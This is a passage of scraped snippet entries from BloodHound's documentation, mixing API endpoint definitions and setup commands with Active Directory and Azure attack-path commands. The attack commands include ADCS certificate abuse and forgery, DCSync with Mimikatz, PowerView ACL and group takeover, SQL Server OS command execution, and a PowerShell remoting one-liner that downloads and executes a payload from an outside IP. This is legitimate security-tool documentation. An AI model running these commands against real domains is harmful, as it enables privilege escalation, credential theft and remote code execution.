.\\cert.pfx\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate Template Enrollment on Windows using Certify\nDESCRIPTION: Uses Certify to request enrollment in the vulnerable certificate template, specifying the affected certification authority. This is the first step in exploiting the ADCS ESC13 vulnerability.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc13.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC13\"\n```\n\n----------------------------------------\n\nTITLE: Backing up CA Certificate with Certipy in Linux\nDESCRIPTION: Uses Certipy to back up the CA certificate with admin credentials on the enterprise CA host.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/golden-cert.mdx#2025-04-23_snippet_4\n\nLANGUAGE: Bash\nCODE:\n```\ncertipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!\n```\n\n----------------------------------------\n\nTITLE: Retrieving LAPS Password with PowerView in PowerShell\nDESCRIPTION: This PowerShell command uses PowerView to retrieve the LAPS password and expiration time for a specific machine.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/read-laps-password.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nGet-DomainComputer \"MachineName\" -Properties \"cn\",\"ms-mcs-admpwd\",\"ms-mcs-admpwdexpirationtime\"\n```\n\n----------------------------------------\n\nTITLE: Adding Member to Domain Group using PowerView\nDESCRIPTION: Uses PowerView's Add-DomainGroupMember cmdlet to add a user to a specified domain group with optional credentials.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/add-member.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred\n```\n\n----------------------------------------\n\nTITLE: Collecting All Data with Output File in AzureHound (JSON)\nDESCRIPTION: This command collects all available data from both Entra ID and AzureRM, outputting the results to a file.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound.mdx#2025-04-23_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -u \"MattNelson@contoso.onmicrosoft.com\" -p \"MyVeryStrongPassword\" list groups --tenant \"contoso.onmicrosoft.com\" -o output.json\n```\n\n----------------------------------------\n\nTITLE: Initializing JWT Bearer Token Authentication for BloodHound API\nDESCRIPTION: Demonstrates the header structure for using JWT bearer token authentication with the BloodHound API. This method is suitable for quick tests or one-time calls but is not recommended for long-term use due to token expiration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/overview.mdx#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nAuthorization: Bearer $JWT_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Rubeus using Certificate in Windows\nDESCRIPTION: Uses Rubeus to request a Ticket Granting Ticket (TGT) from a Domain Controller by authenticating with the obtained certificate, impersonating the target computer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nRubeus.exe asktgt /certificate:cert.pfx /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER\n```\n\n----------------------------------------\n\nTITLE: Loading CSV Data in Cypher\nDESCRIPTION: Demonstrates basic CSV file loading with headers in Cypher. Uses the file protocol to load data from a local CSV file.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_29\n\nLANGUAGE: cypher\nCODE:\n```\nLOAD CSV WITH HEADERS FROM 'file:///data.csv';\n```\n\n----------------------------------------\n\nTITLE: Querying Protected Principals in Active Directory using Cypher\nDESCRIPTION: This Cypher query identifies all protected principals in Active Directory, including members of the Protected Users group and those marked as sensitive.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nMATCH (g:Group)\\nWHERE g.objectid ENDS WITH \"-525\"\\nMATCH (n:Base)\\nWHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)\\nRETURN n\\nLIMIT 1000\n```\n\n----------------------------------------\n\nTITLE: Exploiting RDP Access with Plaintext Credentials and Non-Interactive Access using xfreerdp\nDESCRIPTION: This command uses xfreerdp to establish a Remote Desktop connection with plaintext credentials in a non-interactive environment. This method requires network access to the target, potentially through a proxy like proxychains.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-rdp.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nproxychains xfreerdp /u:dfm /d:testlab.local /v:<computer ip>\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate Template Enrollment on Linux using Certipy\nDESCRIPTION: Uses Certipy on Linux to request enrollment in the vulnerable certificate template, specifying the affected enterprise CA. This allows the attacker to obtain a certificate for further exploitation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc13.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13\n```\n\n----------------------------------------\n\nTITLE: Applying ACE to Target OU in PowerShell\nDESCRIPTION: This PowerShell snippet applies the previously created ACE to a target OU. It retrieves the OU object, sets security masks, adds the new access rule, and commits the changes.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/generic-all.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\n$OU = Get-DomainOU -Raw (OU GUID)\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: Forging Certificate with ForgeCert in Windows\nDESCRIPTION: Uses ForgeCert to forge a certificate for a target principal using the CA certificate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/golden-cert.mdx#2025-04-23_snippet_2\n\nLANGUAGE: Batch\nCODE:\n```\nForgeCert.exe --CaCertPath cert.pfx --CaCertPassword \"password123!\" --Subject \"CN=User\" --SubjectAltName \"roshi@dumpster.fire\" --NewCertPath target.pfx --NewCertPassword \"NewPassword123!\"\n```\n\n----------------------------------------\n\nTITLE: Authenticating as Target Computer Using Certificate with Certipy in Windows\nDESCRIPTION: This command uses Certipy to perform Schannel authentication as the targeted principal against an affected Domain Controller using the issued certificate, providing an LDAP shell.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell\n```\n\n----------------------------------------\n\nTITLE: Setting Computer SPN with PowerView in Windows\nDESCRIPTION: Sets the Service Principal Name (SPN) of the victim computer using PowerView to prevent conflicts when changing the dNSHostName attribute.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}\n```\n\n----------------------------------------\n\nTITLE: Starting AzureHound Configuration\nDESCRIPTION: Command to initiate the configuration process for AzureHound, which will guide the user through setting up Azure connectivity and authentication options.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/create-configuration.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nazurehound.exe configure\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Specification for GET /api/v2/jobs\nDESCRIPTION: Defines the GET /api/v2/jobs endpoint for retrieving job information in the BloodHound Enterprise API. This endpoint is part of the Enterprise Edition features.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/jobs/get-jobs.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/jobs\n```\n\n----------------------------------------\n\nTITLE: Setting Domain Object Owner using PowerView\nDESCRIPTION: Uses PowerView's Set-DomainObjectOwner function to change ownership of a domain object. This example changes the owner of the 'Domain Admins' group to the user 'harmj0y'.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-owner.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nSet-DomainObjectOwner -Credential $Cred -TargetIdentity \"Domain Admins\" -OwnerIdentity harmj0y\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Certificate using Rubeus (Windows)\nDESCRIPTION: Using Rubeus to request a Ticket Granting Ticket (TGT) from the domain using the malicious certificate, impersonating the target user, and injecting it into the current session.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6a.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n.\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Service Principal Secret in AzureHound (JSON)\nDESCRIPTION: Example of using AzureHound with service principal authentication. It shows the usage of -a (app ID), -s (secret), and --tenant flags to authenticate and list Azure resources.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound-flags.mdx#2025-04-23_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -a \"6b5adee8-0d36-45b6-b393-8f29ae8a8cc8\" -s \"<secret>\" --tenant \"contoso.onmicrosoft.com\" list\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI POST Endpoint for MFA Activation in Bloodhound\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a POST endpoint used to activate multi-factor authentication for a specific Bloodhound user. It includes the endpoint path with a user ID parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/activates-mfa-for-an-enrolled-user.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/bloodhound-users/{user_id}/mfa-activation\n```\n\n----------------------------------------\n\nTITLE: Clearing ServicePrincipalName Attribute for Cleanup in PowerShell\nDESCRIPTION: This code snippet demonstrates how to clear the serviceprincipalname attribute using Set-DomainObject, which is an important step for cleaning up after the attack and reducing the risk of detection.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-spn.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nSet-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname\n```\n\n----------------------------------------\n\nTITLE: Certificate Enrollment Using Certipy\nDESCRIPTION: Requests a certificate enrollment for the victim account using the specified template and Enterprise CA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via Python Subsystem in SQL Server with PowerUpSQL\nDESCRIPTION: This command executes operating system commands through SQL Server using the Python subsystem via PowerUpSQL's Invoke-SQLOSPython function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_7\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSPython -Verbose -Command \"Whoami\" -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Cobalt Strike PowerShell Lateral Movement Example\nDESCRIPTION: Shows a complete one-liner for lateral movement using PowerShell remoting that establishes a session, downloads and executes a payload, and cleans up the session afterward.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-ps-remote.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\npowershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session\n-ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))};\nDisconnect-PSSession -Session $session; Remove-PSSession -Session $session\n```\n\n----------------------------------------\n\nTITLE: Executing a Custom Extended Stored Procedure in SQL Server with PowerUpSQL\nDESCRIPTION: This command executes a previously added custom extended stored procedure in SQL Server using PowerUpSQL's Get-SQLQuery function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_13\n\nLANGUAGE: powershell\nCODE:\n```\nGet-SQLQuery -Verbose -Query \"xp_test\" -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Exploiting WriteDacl on Groups in Active Directory using PowerView\nDESCRIPTION: This command uses PowerView's Add-DomainObjectAcl to grant yourself WriteMembers rights on a domain group, which can be used to add yourself to the group.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-dacl.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-DomainObjectAcl -TargetIdentity \"Domain Admins\" -Rights WriteMembers\n```\n\n----------------------------------------\n\nTITLE: Installing AzureHound Enterprise Service on Windows\nDESCRIPTION: Installs AzureHound Enterprise as a Windows service using the command line.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nazurehound.exe install\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Group Admin Rights in BloodHound API\nDESCRIPTION: OpenAPI path specification for retrieving administrator rights of a group using its object_id. The endpoint follows RESTful conventions and is accessible via GET /api/v2/groups/{object_id}/admin-rights.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-admin-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/admin-rights\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate with Certify in Windows\nDESCRIPTION: Uses Certify to request a certificate enrollment as the victim computer with the specified template and Enterprise CA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:SERVERCA-NAME /template:TEMPLATE /machine\n```\n\n----------------------------------------\n\nTITLE: GET API Endpoint for Retrieving Object Controllers in BloodHound\nDESCRIPTION: This OpenAPI endpoint specification defines how to retrieve controllers for a specific object in BloodHound by its ID. The endpoint path includes a path parameter for the object_id of the base object to query.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-base-entities/get-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/base/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Adding New Owner to Group using BARK in PowerShell\nDESCRIPTION: This code example demonstrates how to use BARK's New-GroupOwner function to add a new owner to a Group by specifying the Group Object ID, new owner Object ID, and the authentication token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-owner.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nNew-AppOwner `\n    -GroupObjectId \"352032bf-161d-4788-b77c-b6f935339770\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token\n```\n\n----------------------------------------\n\nTITLE: Instantiating Remote COM Object by ProgID in PowerShell\nDESCRIPTION: This PowerShell code shows how to instantiate a COM object on a remote machine using its ProgID. It requires specifying the target computer name and the ProgID of the COM object.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/execute-dcom.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ComputerName = <target computer name>              # Remote computer\n$ProgId = \"<NAME>\"                                  # GUID of the COM object\n$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)\n$ComObject = [Activator]::CreateInstance($Type)\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Certificate Using Certipy\nDESCRIPTION: Opens an LDAP shell using the generated certificate for authentication against the domain controller.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell\n```\n\n----------------------------------------\n\nTITLE: Instantiating Remote COM Object by CLSID in PowerShell\nDESCRIPTION: This PowerShell code demonstrates how to instantiate a COM object on a remote machine using its CLSID. It requires specifying the target computer name and the GUID of the COM object.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/execute-dcom.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ComputerName = <target computer name>              # Remote computer\n$clsid = \"{fbae34e8-bf95-4da8-bf98-6c6e580aa348}\"   # GUID of the COM object\n$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)\n$ComObject = [Activator]::CreateInstance($Type)\n```\n\n----------------------------------------\n\nTITLE: Searching for Sensitive Data in SQL Server Columns with PowerUpSQL\nDESCRIPTION: This command searches column data in SQL Server for specific keywords like 'card' or 'password' using PowerUpSQL's Get-SQLColumnSampleDataThreaded function, which can also validate credit card numbers.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nGet-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword \"card, password\" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize\n```\n\n----------------------------------------\n\nTITLE: Exploiting WriteDacl on User Objects in Active Directory using PowerView\nDESCRIPTION: This command uses PowerView's Add-DomainObjectAcl to grant yourself full control over a user object, which can be used for account takeover.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-dacl.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-DomainObjectAcl -TargetIdentity harmj0y -Rights All\n```\n\n----------------------------------------\n\nTITLE: Exploiting WriteDacl on GPO Objects in Active Directory using PowerView\nDESCRIPTION: This command uses PowerView's Add-DomainObjectAcl to grant yourself full control over a GPO, which can be used to execute code on systems where the GPO applies.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-dacl.mdx#2025-04-23_snippet_4\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-DomainObjectAcl -TargetIdentity TestGPO -Rights All\n```\n\n----------------------------------------\n\nTITLE: Verifying Group Membership with PowerView\nDESCRIPTION: This snippet demonstrates how to verify that a user was successfully added to a domain group using PowerView's Get-DomainGroupMember function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/add-self.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nGet-DomainGroupMember -Identity 'Domain Admins'\n```\n\n----------------------------------------\n\nTITLE: Resetting BloodHound CE Password on Linux/Mac\nDESCRIPTION: Command to reset the BloodHound Community Edition password using BloodHound CLI on Linux or Mac systems.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n./bloodhound-cli resetpwd\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for OU Details in BloodHound API\nDESCRIPTION: OpenAPI specification for the GET endpoint to retrieve details of an Organizational Unit (OU) by its object ID. This endpoint is part of the BloodHound API v2.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ous/get-ou-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/ous/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Creating Security Descriptor for RBCD Attack\nDESCRIPTION: Creates a new RawSecurityDescriptor with an Access Control Entry (ACE) that allows the attacker-controlled computer to act on behalf of other identities. This prepares the security descriptor that will be applied to the target computer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/allowed-to-act.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Username and Password in AzureHound (JSON)\nDESCRIPTION: Example of using AzureHound with username and password authentication. It demonstrates the use of -u (username), -p (password), and --tenant flags to authenticate and list Azure AD resources.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound-flags.mdx#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -u \"MattNelson@contoso.onmicrosoft.com\" -p \"MyVerySecurePassword123\" --tenant \"contoso.onmicrosoft.com\" list\n```\n\n----------------------------------------\n\nTITLE: Deploying AzureHound Enterprise with Docker Compose\nDESCRIPTION: Pulls the latest AzureHound Enterprise Docker image and starts the container using Docker Compose.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ndocker-compose pull && docker-compose up -d\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Path for BloodHound Audit Endpoint\nDESCRIPTION: OpenAPI specification for the GET /api/v2/audit endpoint in the BloodHound application. This endpoint is available in both Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/audit/list-audit-logs.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/audit\n```\n\n----------------------------------------\n\nTITLE: Setting Victim's Mail Attribute (Windows)\nDESCRIPTION: Sets the 'mail' attribute of the victim to a dummy email using PowerView if it's not already set.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}\n```\n\n----------------------------------------\n\nTITLE: Acquiring MS Graph Token with Client Credentials in PowerShell\nDESCRIPTION: This snippet demonstrates how to use BARK's Get-MSGraphTokenWithClientCredentials function to acquire an MS Graph-scoped JWT by providing a Service Principal Client ID, secret, and tenant name.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-owner.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate to PFX Format (Windows)\nDESCRIPTION: This command converts the emitted certificate to PFX format using certutil.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc1.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\cert.pem .\\cert.pfx\n```\n\n----------------------------------------\n\nTITLE: Fetching Azure Key Vault Secrets using PowerZure in PowerShell\nDESCRIPTION: These PowerShell commands utilize the PowerZure module to retrieve and export content from Azure Key Vaults. 'Get-AzureKeyVaultContent' fetches the secrets, while 'Export-AzureKeyVaultcontent' exports them.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-get-secrets.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nGet-AzureKeyVaultContent\n```\n\nLANGUAGE: powershell\nCODE:\n```\nExport-AzureKeyVaultcontent\n```\n\n----------------------------------------\n\nTITLE: Setting ServicePrincipalName Attribute Using Set-DomainObject in PowerShell\nDESCRIPTION: This code uses the Set-DomainObject cmdlet from PowerView to set the serviceprincipalname attribute on a user object. This is a key step in preparing for a targeted kerberoasting attack.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-spn.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nSet-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}\n```\n\n----------------------------------------\n\nTITLE: Adding User to Domain Group with PowerView\nDESCRIPTION: This snippet shows how to use PowerView's Add-DomainGroupMember function to add a user to a domain group, specifically exploiting the AddSelf privilege. It includes an optional credential parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/add-self.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred\n```\n\n----------------------------------------\n\nTITLE: Performing DCSync Attack using Mimikatz in Windows\nDESCRIPTION: This command uses Mimikatz to perform a DCSync attack, extracting user credentials from the Domain Controller.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nlsadump::dcsync /domain:<domain.name> /user:<DOMAIN\\targetuser>\n```\n\n----------------------------------------\n\nTITLE: Setting Computer dNSHostName with PowerView in Windows\nDESCRIPTION: Changes the dNSHostName attribute of the victim computer to match the targeted computer's dNSHostName using PowerView.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'dnshostname'='target.corp.local'}\n```\n\n----------------------------------------\n\nTITLE: Defining BloodHound API Login Endpoint in OpenAPI\nDESCRIPTION: This OpenAPI snippet defines the POST /api/v2/login endpoint for the BloodHound API. It specifies the route for user authentication in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/login-to-bloodhound.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: post /api/v2/login\n```\n\n----------------------------------------\n\nTITLE: Retrieving Completed Jobs for a Client in BloodHound API\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves completed jobs for a specific client. The endpoint requires a client_id parameter to identify which client's completed jobs should be returned.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/list-all-completed-jobs-for-a-client.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/clients/{client_id}/completed-jobs\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via R Subsystem in SQL Server with PowerUpSQL\nDESCRIPTION: This command executes operating system commands through SQL Server using the R subsystem via PowerUpSQL's Invoke-SQLOSR function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_8\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Domain Controllers Retrieval in YAML\nDESCRIPTION: This YAML snippet defines an OpenAPI endpoint specification for retrieving domain controllers from a specific domain. It specifies the HTTP GET method and the endpoint path structure which includes a domain object ID parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Creating PowerShell Credentials for Domain Authentication\nDESCRIPTION: Creates a PSCredential object for authenticating to the domain controller with specific user credentials.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/add-member.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)\n```\n\n----------------------------------------\n\nTITLE: Granting Certificate Template Ownership in PowerShell\nDESCRIPTION: This PowerShell snippet grants ownership of a specified certificate template to a principal.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n$principalName = \"principal\" # SAM account name of principal\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n\n# Set owner\n$acl = $template.psbase.ObjectSecurity\n$account = New-Object System.Security.Principal.NTAccount($principalName)\n$acl.SetOwner($account)\n$template.psbase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate as Victim (Windows)\nDESCRIPTION: Uses Certify to request enrollment in the affected template, specifying the affected EnterpriseCA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Removing SPN with ldapmodify in 